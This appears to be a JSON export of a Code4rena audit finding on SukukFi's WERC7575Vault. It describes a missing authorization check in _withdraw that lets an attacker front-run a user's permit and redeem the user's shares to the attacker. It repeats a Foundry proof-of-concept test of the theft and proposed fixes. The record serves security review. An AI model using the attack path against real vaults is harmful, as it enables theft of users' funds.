@@ -1,0 +1,118 @@
+{
+  "pairing": {
+    "match_status": "exact_submission",
+    "project": "SukukFi_syLyTBz5KNA",
+    "audit_uid": "syLyTBz5KNA",
+    "requested_submission_uid": "8dibfsNmsLW",
+    "requested_finding_uid": "SZy2Ly7Y3Cu",
+    "source_kind": "pipeline_findings",
+    "source_path": "/root/sc_slicer_standalone/c4_pipeline_output/SukukFi_syLyTBz5KNA/20260618_141723/findings.json",
+    "source_submission_uid": "8dibfsNmsLW",
+    "source_finding_uid": "SZy2Ly7Y3Cu",
+    "original_report_path": "SukukFi_syLyTBz5KNA\\high_valid_8dibfsNmsLW.json",
+    "note": "The report is the exact submission paired with this contract."
+  },
+  "submission_uid": "8dibfsNmsLW",
+  "finding_uid": "SZy2Ly7Y3Cu",
+  "finding_number": "3",
+  "title": "Lack of checks in `WERC7575Vault::_withdraw` allows attacker to steal user's withdraw/redeem",
+  "severity": "high",
+  "validity": "valid",
+  "quality": "sufficient",
+  "user_handle": "0xCrypt0nite",
+  "body": "## Finding description and impact\n**Root Cause**\n\nFrom the code comments of `WERC7575Vault::withdraw` and `WERC7575Vault::redeem`, it is intended that the caller of these functions must be share owner or an operator having allowance for the owner's shares.\n\n```text\n     * AUTHORIZATION:\n     * - msg.sender must be owner OR have allowance for the shares\n     * - Allows delegation to withdrawal operators\n```\n\nHowever, [`WERC7575Vault::_withdraw`](https://github.com/code-423n4/2025-11-sukukfi/blob/d7e734192a571511f47962e7f228ad5ed275e7db/src/WERC7575Vault.sol#L397) does not enforce these conditions, allowing an attacker to withdraw/redeem the user's shares using the attacker's address as the receiver of assets. Thus, an attacker can steal the user's funds.\n\n**Happy Path 1**\n\n1. Validator signs permit signature and gives signature to user off-chain\n2. User broadcasts `WERC7575ShareToken::permit` and `WERC7575Vault::withdraw/redeem` transaction\n3. User's withdraw/redeem transaction succeeds, user (or the rightful receiver) receives the assets\n\n**Attack Path 1**\n\n1. Validator signs permit signature and gives signature to user off-chain\n2. User broadcasts `WERC7575ShareToken::permit` and `WERC7575Vault::withdraw/redeem` transaction\n3. Attacker sees user's transaction in the mempool and frontruns user's withdraw/redeem\n   - Attacker calls `WERC7575ShareToken::permit` using parameters and signatures extracted from user's calldata\n   - Attacker calls `WERC7575Vault::withdraw/redeem` to withdraw/redeem the user's assets/shares but with attacker's address as the receiver\n4. User's permit transaction and withdraw/redeem transaction fails\n5. Attacker profits from stealing user's funds\n\n**Happy Path 2**\n\n1. Validator signs permit signature\n2. Validator calls `WERC7575ShareToken::permit` to give user self-allowance\n3. User calls `WERC7575Vault::withdraw/redeem` to withdraw assets or redeem shares\n\n**Attack Path 2**\n\n1. Validator signs permit signature\n2. Validator calls `WERC7575ShareToken::permit` to give user self-allowance\n3. Attacker immediately calls `WERC7575Vault::withdraw/redeem` to withdraw/redeem the user's assets/shares but with attacker's address as the receiver\n4. Attacker profits from stealing user's funds\n\n**Impact**\n\n1. Loss of funds to user\n2. Attacker profits from stealing user's funds\n\n## Recommended mitigation steps\n\nSuggest to implement either of these mitigations:\n\n1. Check that msg.sender is owner in `WERC7575Vault::_withdraw`\n```diff\nfunction _withdraw(uint256 assets, uint256 shares, address receiver, address owner) internal {\n+   require(msg.sender == owner, \"not owner\");\n```\n\n2. If delegation functionality is intended, implement the following changes\nIn `WERC7575Vault::_withdraw`, add the following lines\n```diff\nfunction _withdraw(uint256 assets, uint256 shares, address receiver, address owner) internal {\n+   if (msg.sender != owner) {\n+       _shareToken.spendAllowance(owner, msg.sender, shares);\n+   }\n```\n\nIn `WERC7575ShareToken`, add the following function\n```diff\n+   function spendAllowance(address owner, address caller, uint256 shares) external onlyVaults {\n+       _spendAllowance(owner, caller, shares);\n+   }\n```",
+  "proof_of_concept": "Place the following into `WERC7575.t.sol` and run\n\n> forge test --mt testAttackerCanStealUsersWithdrawRedeem\n\n```javascript\n    function testAttackerCanStealUsersWithdrawRedeem() public {\n        // 0. User1 deposits\n        uint256 depositAmount = 1000 * 1e18;\n        vm.startPrank(user1);\n        token.approve(address(vault), depositAmount);\n        uint256 shares = vault.deposit(depositAmount, user1);\n        vm.stopPrank();\n        \n        // 1. Validator gives user1 self-allowance through permit signature\n        uint256 deadline = block.timestamp + 3600;\n        bytes32 structHash =\n            keccak256(abi.encode(keccak256(\"Permit(address owner,address spender,uint256 value,uint256 nonce,uint256 deadline)\"), user1, user1, shares, shareToken.nonces(user1), deadline));\n        bytes32 digest = keccak256(abi.encodePacked(\"\\x19\\x01\", shareToken.DOMAIN_SEPARATOR(), structHash));\n        (uint8 v, bytes32 r, bytes32 s) = vm.sign(validatorPrivateKey, digest);\n\n        // 2. User1 broadcasts permit and withdraw/redeem transaction\n        // vm.startPrank(user1);\n        // shareToken.permit(user1, user1, shares, deadline, v, r, s);\n        // uint256 assetsRedeemedUser = vault.redeem(shares, user1, user1);\n        // vm.stopPrank();\n\n        // 3. Attacker sees user1's transaction in the mempool and frontruns user1's withdraw/redeem\n        address attacker = makeAddr(\"attacker\");\n        uint256 attackerBalanceBefore = token.balanceOf(attacker);\n        vm.startPrank(attacker);\n        // attacker extracts signature from user1's calldata and calls permit\n        shareToken.permit(user1, user1, shares, deadline, v, r, s);\n        // attacker steals user1's funds by replacing the receiver field\n        uint256 assetsRedeemedAttacker = vault.redeem(shares, attacker, user1);\n        vm.stopPrank();\n        assertEq(assetsRedeemedAttacker, depositAmount);\n\n        // 4. User1's permit and withdraw/redeem fails\n        vm.startPrank(user1);\n        vm.expectRevert();\n        shareToken.permit(user1, user1, shares, deadline, v, r, s);\n        vm.expectRevert();\n        uint256 assetsRedeemedUser = vault.redeem(shares, user1, user1);\n        vm.stopPrank();\n        assertEq(assetsRedeemedUser, 0);\n\n        // 5. Attacker profits\n        uint256 attackerBalanceAfter = token.balanceOf(attacker);\n        assertEq(attackerBalanceBefore, 0);\n        assertEq(attackerBalanceAfter, depositAmount);\n    }\n```",
+  "lines_of_code": [
+    "https://github.com/code-423n4/2025-11-sukukfi/blob/d7e734192a571511f47962e7f228ad5ed275e7db/src/WERC7575Vault.sol#L397"
+  ],
+  "source_record": {
+    "project_id": "syLyTBz5KNA",
+    "submission_index": "272",
+    "api_submission_id": "",
+    "uid": "8dibfsNmsLW",
+    "number": "272",
+    "title": "Lack of checks in `WERC7575Vault::_withdraw` allows attacker to steal user's withdraw/redeem",
+    "severity": "high",
+    "validity": "valid",
+    "quality": "sufficient",
+    "handle": "0xCrypt0nite",
+    "lines_of_code": [
+      "https://github.com/code-423n4/2025-11-sukukfi/blob/d7e734192a571511f47962e7f228ad5ed275e7db/src/WERC7575Vault.sol#L397"
+    ],
+    "body": "## Finding description and impact\n**Root Cause**\n\nFrom the code comments of `WERC7575Vault::withdraw` and `WERC7575Vault::redeem`, it is intended that the caller of these functions must be share owner or an operator having allowance for the owner's shares.\n\n```text\n     * AUTHORIZATION:\n     * - msg.sender must be owner OR have allowance for the shares\n     * - Allows delegation to withdrawal operators\n```\n\nHowever, [`WERC7575Vault::_withdraw`](https://github.com/code-423n4/2025-11-sukukfi/blob/d7e734192a571511f47962e7f228ad5ed275e7db/src/WERC7575Vault.sol#L397) does not enforce these conditions, allowing an attacker to withdraw/redeem the user's shares using the attacker's address as the receiver of assets. Thus, an attacker can steal the user's funds.\n\n**Happy Path 1**\n\n1. Validator signs permit signature and gives signature to user off-chain\n2. User broadcasts `WERC7575ShareToken::permit` and `WERC7575Vault::withdraw/redeem` transaction\n3. User's withdraw/redeem transaction succeeds, user (or the rightful receiver) receives the assets\n\n**Attack Path 1**\n\n1. Validator signs permit signature and gives signature to user off-chain\n2. User broadcasts `WERC7575ShareToken::permit` and `WERC7575Vault::withdraw/redeem` transaction\n3. Attacker sees user's transaction in the mempool and frontruns user's withdraw/redeem\n   - Attacker calls `WERC7575ShareToken::permit` using parameters and signatures extracted from user's calldata\n   - Attacker calls `WERC7575Vault::withdraw/redeem` to withdraw/redeem the user's assets/shares but with attacker's address as the receiver\n4. User's permit transaction and withdraw/redeem transaction fails\n5. Attacker profits from stealing user's funds\n\n**Happy Path 2**\n\n1. Validator signs permit signature\n2. Validator calls `WERC7575ShareToken::permit` to give user self-allowance\n3. User calls `WERC7575Vault::withdraw/redeem` to withdraw assets or redeem shares\n\n**Attack Path 2**\n\n1. Validator signs permit signature\n2. Validator calls `WERC7575ShareToken::permit` to give user self-allowance\n3. Attacker immediately calls `WERC7575Vault::withdraw/redeem` to withdraw/redeem the user's assets/shares but with attacker's address as the receiver\n4. Attacker profits from stealing user's funds\n\n**Impact**\n\n1. Loss of funds to user\n2. Attacker profits from stealing user's funds\n\n## Recommended mitigation steps\n\nSuggest to implement either of these mitigations:\n\n1. Check that msg.sender is owner in `WERC7575Vault::_withdraw`\n```diff\nfunction _withdraw(uint256 assets, uint256 shares, address receiver, address owner) internal {\n+   require(msg.sender == owner, \"not owner\");\n```\n\n2. If delegation functionality is intended, implement the following changes\nIn `WERC7575Vault::_withdraw`, add the following lines\n```diff\nfunction _withdraw(uint256 assets, uint256 shares, address receiver, address owner) internal {\n+   if (msg.sender != owner) {\n+       _shareToken.spendAllowance(owner, msg.sender, shares);\n+   }\n```\n\nIn `WERC7575ShareToken`, add the following function\n```diff\n+   function spendAllowance(address owner, address caller, uint256 shares) external onlyVaults {\n+       _spendAllowance(owner, caller, shares);\n+   }\n```",
+    "proof_of_concept": "Place the following into `WERC7575.t.sol` and run\n\n> forge test --mt testAttackerCanStealUsersWithdrawRedeem\n\n```javascript\n    function testAttackerCanStealUsersWithdrawRedeem() public {\n        // 0. User1 deposits\n        uint256 depositAmount = 1000 * 1e18;\n        vm.startPrank(user1);\n        token.approve(address(vault), depositAmount);\n        uint256 shares = vault.deposit(depositAmount, user1);\n        vm.stopPrank();\n        \n        // 1. Validator gives user1 self-allowance through permit signature\n        uint256 deadline = block.timestamp + 3600;\n        bytes32 structHash =\n            keccak256(abi.encode(keccak256(\"Permit(address owner,address spender,uint256 value,uint256 nonce,uint256 deadline)\"), user1, user1, shares, shareToken.nonces(user1), deadline));\n        bytes32 digest = keccak256(abi.encodePacked(\"\\x19\\x01\", shareToken.DOMAIN_SEPARATOR(), structHash));\n        (uint8 v, bytes32 r, bytes32 s) = vm.sign(validatorPrivateKey, digest);\n\n        // 2. User1 broadcasts permit and withdraw/redeem transaction\n        // vm.startPrank(user1);\n        // shareToken.permit(user1, user1, shares, deadline, v, r, s);\n        // uint256 assetsRedeemedUser = vault.redeem(shares, user1, user1);\n        // vm.stopPrank();\n\n        // 3. Attacker sees user1's transaction in the mempool and frontruns user1's withdraw/redeem\n        address attacker = makeAddr(\"attacker\");\n        uint256 attackerBalanceBefore = token.balanceOf(attacker);\n        vm.startPrank(attacker);\n        // attacker extracts signature from user1's calldata and calls permit\n        shareToken.permit(user1, user1, shares, deadline, v, r, s);\n        // attacker steals user1's funds by replacing the receiver field\n        uint256 assetsRedeemedAttacker = vault.redeem(shares, attacker, user1);\n        vm.stopPrank();\n        assertEq(assetsRedeemedAttacker, depositAmount);\n\n        // 4. User1's permit and withdraw/redeem fails\n        vm.startPrank(user1);\n        vm.expectRevert();\n        shareToken.permit(user1, user1, shares, deadline, v, r, s);\n        vm.expectRevert();\n        uint256 assetsRedeemedUser = vault.redeem(shares, user1, user1);\n        vm.stopPrank();\n        assertEq(assetsRedeemedUser, 0);\n\n        // 5. Attacker profits\n        uint256 attackerBalanceAfter = token.balanceOf(attacker);\n        assertEq(attackerBalanceBefore, 0);\n        assertEq(attackerBalanceAfter, depositAmount);\n    }\n```",
+    "detail_url": "https://code4rena.com/api/v1/audits/syLyTBz5KNA/submissions/272",
+    "raw": {
+      "auditUid": "syLyTBz5KNA",
+      "createdAt": "2025-12-01T13:14:33.634Z",
+      "deletedAt": null,
+      "evaluations": [
+        {
+          "uid": "pgCCFrx2Aoj",
+          "userUid": "67uFCZeAHcw",
+          "userAuditRole": "judge",
+          "createdAt": "2025-12-23T03:29:13.852Z",
+          "type": "severity",
+          "value": "high",
+          "submissionUid": null,
+          "findingUid": "SZy2Ly7Y3Cu"
+        },
+        {
+          "uid": "mAwdhUhdkZC",
+          "userUid": "67uFCZeAHcw",
+          "userAuditRole": "judge",
+          "createdAt": "2026-01-27T23:03:48.397Z",
+          "type": "validity",
+          "value": "valid",
+          "submissionUid": null,
+          "findingUid": "SZy2Ly7Y3Cu"
+        },
+        {
+          "uid": "z6UHDicTAQn",
+          "userUid": "67uFCZeAHcw",
+          "userAuditRole": "judge",
+          "createdAt": "2026-01-27T23:15:03.947Z",
+          "type": "quality",
+          "value": "sufficient",
+          "submissionUid": "8dibfsNmsLW",
+          "findingUid": null
+        }
+      ],
+      "finding": {
+        "uid": "SZy2Ly7Y3Cu",
+        "number": 3,
+        "duplicates": 164
+      },
+      "isPrimary": false,
+      "latestEvaluations": {
+        "credit": null,
+        "mitigationStatus": null,
+        "quality": "sufficient",
+        "rank": null,
+        "severity": "high",
+        "validity": "valid",
+        "updatedAt": "2026-02-03T19:20:37.287Z"
+      },
+      "mitigationOf": null,
+      "mitigationStatus": null,
+      "severity": "high",
+      "team": null,
+      "title": "Lack of checks in `WERC7575Vault::_withdraw` allows attacker to steal user's withdraw/redeem",
+      "uid": "8dibfsNmsLW",
+      "updatedAt": "2025-12-01T13:17:38.682Z",
+      "user": {
+        "uid": "K9yn47rsj87",
+        "handle": "0xCrypt0nite"
+      },
+      "sensitivity": "non-sensitive",
+      "aiSeverity": null,
+      "aiValidity": null,
+      "body": "## Finding description and impact\n**Root Cause**\n\nFrom the code comments of `WERC7575Vault::withdraw` and `WERC7575Vault::redeem`, it is intended that the caller of these functions must be share owner or an operator having allowance for the owner's shares.\n\n```text\n     * AUTHORIZATION:\n     * - msg.sender must be owner OR have allowance for the shares\n     * - Allows delegation to withdrawal operators\n```\n\nHowever, [`WERC7575Vault::_withdraw`](https://github.com/code-423n4/2025-11-sukukfi/blob/d7e734192a571511f47962e7f228ad5ed275e7db/src/WERC7575Vault.sol#L397) does not enforce these conditions, allowing an attacker to withdraw/redeem the user's shares using the attacker's address as the receiver of assets. Thus, an attacker can steal the user's funds.\n\n**Happy Path 1**\n\n1. Validator signs permit signature and gives signature to user off-chain\n2. User broadcasts `WERC7575ShareToken::permit` and `WERC7575Vault::withdraw/redeem` transaction\n3. User's withdraw/redeem transaction succeeds, user (or the rightful receiver) receives the assets\n\n**Attack Path 1**\n\n1. Validator signs permit signature and gives signature to user off-chain\n2. User broadcasts `WERC7575ShareToken::permit` and `WERC7575Vault::withdraw/redeem` transaction\n3. Attacker sees user's transaction in the mempool and frontruns user's withdraw/redeem\n   - Attacker calls `WERC7575ShareToken::permit` using parameters and signatures extracted from user's calldata\n   - Attacker calls `WERC7575Vault::withdraw/redeem` to withdraw/redeem the user's assets/shares but with attacker's address as the receiver\n4. User's permit transaction and withdraw/redeem transaction fails\n5. Attacker profits from stealing user's funds\n\n**Happy Path 2**\n\n1. Validator signs permit signature\n2. Validator calls `WERC7575ShareToken::permit` to give user self-allowance\n3. User calls `WERC7575Vault::withdraw/redeem` to withdraw assets or redeem shares\n\n**Attack Path 2**\n\n1. Validator signs permit signature\n2. Validator calls `WERC7575ShareToken::permit` to give user self-allowance\n3. Attacker immediately calls `WERC7575Vault::withdraw/redeem` to withdraw/redeem the user's assets/shares but with attacker's address as the receiver\n4. Attacker profits from stealing user's funds\n\n**Impact**\n\n1. Loss of funds to user\n2. Attacker profits from stealing user's funds\n\n## Recommended mitigation steps\n\nSuggest to implement either of these mitigations:\n\n1. Check that msg.sender is owner in `WERC7575Vault::_withdraw`\n```diff\nfunction _withdraw(uint256 assets, uint256 shares, address receiver, address owner) internal {\n+   require(msg.sender == owner, \"not owner\");\n```\n\n2. If delegation functionality is intended, implement the following changes\nIn `WERC7575Vault::_withdraw`, add the following lines\n```diff\nfunction _withdraw(uint256 assets, uint256 shares, address receiver, address owner) internal {\n+   if (msg.sender != owner) {\n+       _shareToken.spendAllowance(owner, msg.sender, shares);\n+   }\n```\n\nIn `WERC7575ShareToken`, add the following function\n```diff\n+   function spendAllowance(address owner, address caller, uint256 shares) external onlyVaults {\n+       _spendAllowance(owner, caller, shares);\n+   }\n```",
+      "proofOfConcept": "Place the following into `WERC7575.t.sol` and run\n\n> forge test --mt testAttackerCanStealUsersWithdrawRedeem\n\n```javascript\n    function testAttackerCanStealUsersWithdrawRedeem() public {\n        // 0. User1 deposits\n        uint256 depositAmount = 1000 * 1e18;\n        vm.startPrank(user1);\n        token.approve(address(vault), depositAmount);\n        uint256 shares = vault.deposit(depositAmount, user1);\n        vm.stopPrank();\n        \n        // 1. Validator gives user1 self-allowance through permit signature\n        uint256 deadline = block.timestamp + 3600;\n        bytes32 structHash =\n            keccak256(abi.encode(keccak256(\"Permit(address owner,address spender,uint256 value,uint256 nonce,uint256 deadline)\"), user1, user1, shares, shareToken.nonces(user1), deadline));\n        bytes32 digest = keccak256(abi.encodePacked(\"\\x19\\x01\", shareToken.DOMAIN_SEPARATOR(), structHash));\n        (uint8 v, bytes32 r, bytes32 s) = vm.sign(validatorPrivateKey, digest);\n\n        // 2. User1 broadcasts permit and withdraw/redeem transaction\n        // vm.startPrank(user1);\n        // shareToken.permit(user1, user1, shares, deadline, v, r, s);\n        // uint256 assetsRedeemedUser = vault.redeem(shares, user1, user1);\n        // vm.stopPrank();\n\n        // 3. Attacker sees user1's transaction in the mempool and frontruns user1's withdraw/redeem\n        address attacker = makeAddr(\"attacker\");\n        uint256 attackerBalanceBefore = token.balanceOf(attacker);\n        vm.startPrank(attacker);\n        // attacker extracts signature from user1's calldata and calls permit\n        shareToken.permit(user1, user1, shares, deadline, v, r, s);\n        // attacker steals user1's funds by replacing the receiver field\n        uint256 assetsRedeemedAttacker = vault.redeem(shares, attacker, user1);\n        vm.stopPrank();\n        assertEq(assetsRedeemedAttacker, depositAmount);\n\n        // 4. User1's permit and withdraw/redeem fails\n        vm.startPrank(user1);\n        vm.expectRevert();\n        shareToken.permit(user1, user1, shares, deadline, v, r, s);\n        vm.expectRevert();\n        uint256 assetsRedeemedUser = vault.redeem(shares, user1, user1);\n        vm.stopPrank();\n        assertEq(assetsRedeemedUser, 0);\n\n        // 5. Attacker profits\n        uint256 attackerBalanceAfter = token.balanceOf(attacker);\n        assertEq(attackerBalanceBefore, 0);\n        assertEq(attackerBalanceAfter, depositAmount);\n    }\n```",
+      "linesOfCode": "https://github.com/code-423n4/2025-11-sukukfi/blob/d7e734192a571511f47962e7f228ad5ed275e7db/src/WERC7575Vault.sol#L397",
+      "number": 272,
+      "aiExplanation": null,
+      "_index": 272
+    }
+  }
+}
